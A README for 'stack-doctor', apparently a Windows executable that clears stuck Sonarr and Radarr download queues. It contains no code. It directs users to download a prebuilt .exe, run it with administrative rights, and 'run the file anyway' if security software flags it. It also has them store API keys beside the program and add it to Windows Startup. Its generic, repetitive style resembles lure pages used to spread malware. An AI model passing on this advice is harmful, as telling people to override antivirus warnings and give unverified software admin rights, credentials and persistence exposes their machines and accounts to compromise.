# 🛠️ stack-doctor - Fix stuck media downloads automatically

[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/Teamsterroundrobin241/stack-doctor/releases)

stack-doctor monitors your media management system. It finds items that stall in your download queue. These items often get stuck due to dead links or errors during file transfers. This tool detects these issues and clears them. It ensures your media library updates without manual intervention.

## 📥 Getting Started

You do not need programming skills to use this tool. Follow these steps to set up the software on your Windows computer.

1. Visit the [official releases page](https://github.com/Teamsterroundrobin241/stack-doctor/releases) to access the download files.
2. Look for the file ending in .exe under the latest version header.
3. Click the file name to start the download.
4. Save the file to a folder you can find easily.
5. Double-click the file to run the program.

## ⚙️ Configuration

The program uses an environment file to talk to your other media software. Follow these steps to configure your settings.

1. Open the folder where you saved the program.
2. Look for a file named .env. If it does not exist, create a new text file and name it .env.
3. Open this file with Notepad.
4. Add your Sonarr and Radarr web addresses here. 
5. Include the API keys from your software settings pages. 
6. Save the file and close it.
7. Restart the stack-doctor program to apply the changes.

## 🖥️ System Requirements

This tool runs on standard Windows systems. You need a stable internet connection for the tool to communicate with your media servers. Ensure that your media software has the API ports open for local traffic. The program footprint is small and will not slow down your computer during normal operation. 

## 🛡️ How It Works

The software checks your queue at set intervals. It identifies grabs that fail to complete. If a download remains in a state of limbo for too long, the tool marks it for action. You can set the tool to remove these items or to retry the process. This keeps your queue clear so that new media can download correctly.

The tool uses internal logic to decide if an item is truly stuck or just slow. It excludes files that are currently active and downloading. You avoid the risk of losing good data. The tool targets only the items that stop functioning.

## 📋 Common Features

- Automatic queue scanning: The software watches your lists in the background.
- Error reporting: The logs show every action the tool takes.
- Flexible frequency: You determine how often the tool checks your queue.
- Webhook support: You can send alerts to other apps when the tool clears a stuck item.
- Low resource usage: The program stays out of your way while it runs.

## 🛠️ Troubleshooting

If you encounter issues, check your network connection first. The program must reach your Sonarr or Radarr instance to function. Verify that your API keys are correct inside the .env file. Copy and paste the keys to avoid typos. 

If the program fails to start, verify that you have administrative rights on your machine. Sometimes security software flags new downloads. If this happens, choose to run the file anyway. 

Check the log file inside the program directory if you face repeated errors. This text file contains a history of the program actions. You can use the details in this file to identify which setting needs adjustment.

## 🚀 Advanced Automation

You can set the program to run every time you turn on your computer. Create a shortcut to the program file. Move this shortcut into your Windows Startup folder. Doing this ensures the tool watches your queue without requiring you to open it manually.

The program includes a check feature for your download client. If you use SABnzbd, the tool interacts with it to verify if a file is truly gone from the disk. This prevents the tool from deleting items that are still waiting for a retry.

## 📁 File Structure

- stack-doctor.exe: The main executable file.
- .env: Your personal configuration file.
- logs.txt: The record of actions the tool creates.

Keep these files in one folder. Do not move the executable away from the folder, as it relies on the other files to maintain your settings. 

## 🌐 Community

This project relies on standard community tools for media automation. Users of Plex, Sonarr, and Radarr find this tool helpful for maintaining clean download lists. You do not need to install complex dependencies or Python environments. The tool includes everything necessary to execute on a Windows machine.

The logic focuses on stability. It does not attempt to change your media files. It only changes the state of the items in your queue. You maintain full control over your media collection at all times.